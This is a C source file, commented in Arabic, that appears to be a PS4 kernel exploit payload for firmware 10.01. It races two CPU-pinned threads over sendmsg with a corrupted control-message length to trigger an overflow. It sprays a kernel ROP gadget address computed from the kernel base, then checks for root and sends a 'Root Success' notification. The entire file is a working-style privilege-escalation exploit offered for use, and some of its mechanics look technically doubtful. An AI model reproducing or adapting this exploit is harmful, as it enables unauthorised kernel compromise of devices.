#include <ps4.h>
//#include "payload_utils.h" // ضروري لاستخدام get_kernel_base()

// تعريف الهياكل الضرورية
struct msghdr {
    void         *msg_name;
    uint32_t      msg_namelen;
    void         *msg_iov;
    int           msg_iovlen;
    void         *msg_control;
    uint32_t      msg_controllen;
    int           msg_flags;
};

struct cmsghdr {
    uint32_t      cmsg_len;
    int           cmsg_level;
    int           cmsg_type;
};

// الإزاحات الخاصة بـ 10.01 التي وجدتها
#define JMP_RSI_GADGET_OFFSET 0x68B1
#define IP_RETOPTS 7
#define ITERATIONS 500000 // زيادة المحاولات للسباق
#define CONTROL_LEN 256

struct cmsghdr *cmsg;
uint8_t control_buf[CONTROL_LEN];
int global_sock;
int running = 1;

// خيط إرسال الرسالة (Trigger)
void *sendmsg_thread(void *arg) {
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;

    while(running) {
        // Syscall 28 هو sendmsg
        syscall(28, global_sock, &msg, 0);
    }
    return NULL;
}

// خيط السباق (The Racer)
void *race_thread(void *arg) {
    while(running) {
        cmsg->cmsg_len = 0x50;   // القيمة الصحيحة للفحص
        cmsg->cmsg_len = 0xFFFF; // القيمة الفائضة للفيضان
    }
    return NULL;
}

// دالة بناء البايلود باستخدام Offsets 10.01
void build_payload(uint64_t kbase) {
    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = IP_RETOPTS;
    cmsg->cmsg_len = 0x50;

    // وضع الـ Gadget في مكان ext_free المتوقع عند حدوث الفيضان
    // نضع العنوان في أماكن متعددة لزيادة احتمالية الإصابة (Spraying)
    uint64_t target_gadget = kbase + JMP_RSI_GADGET_OFFSET;
    for (int i = 0x60; i < CONTROL_LEN - 8; i += 8) {
        *(uint64_t *)(control_buf + i) = target_gadget;
    }
}

int _main(struct thread *td) {
    // 1. تهيئة المكتبات من الـ SDK
    initKernel();
    initLibc();
    initNetwork();

    // 2. جلب Kernel Base تلقائياً (من ملف payload_utils.h)
    uint64_t kbase = get_kernel_base();
    if (kbase == 0) return -1;

    // 3. تجهيز المقبس والبايلود
    global_sock = syscall(97, 2, 2, 0); // socket(AF_INET, SOCK_DGRAM, 0)
    build_payload(kbase);

    // 4. إعداد الأنوية (Affinity) لضمان سرعة السباق
    ScePthread thread1, thread2;
    cpuset_t cpu6, cpu7;
    CPU_ZERO(&cpu6); CPU_ZERO(&cpu7);
    CPU_SET(6, &cpu6); CPU_SET(7, &cpu7);

    // 5. إطلاق الخيوط
    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadSetaffinityNp(thread1, sizeof(cpu6), &cpu6);

    scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race");
    scePthreadSetaffinityNp(thread2, sizeof(cpu7), &cpu7);

    // 6. المراقبة: هل نجحنا في أن نصبح Root؟
    while(running) {
        if (getuid() == 0) {
            running = 0; // إيقاف السباق
            
            // إرسال إشعار بالنجاح
            SceNotificationRequest notify;
            notify.type = 0;
            snprintf(notify.message, sizeof(notify.message), "Root Success! FW 10.01");
            sceKernelSendNotificationRequest(0, &notify, sizeof(notify), 0);
            
            // هنا يمكنك استدعاء الـ Jailbreak الفعلي من الـ SDK
            //jailbreak(); 
            break;
        }
        sceKernelUsleep(500000); // تفقد كل نصف ثانية
    }

    scePthreadJoin(thread1, NULL);
    scePthreadJoin(thread2, NULL);

    return 0;
}
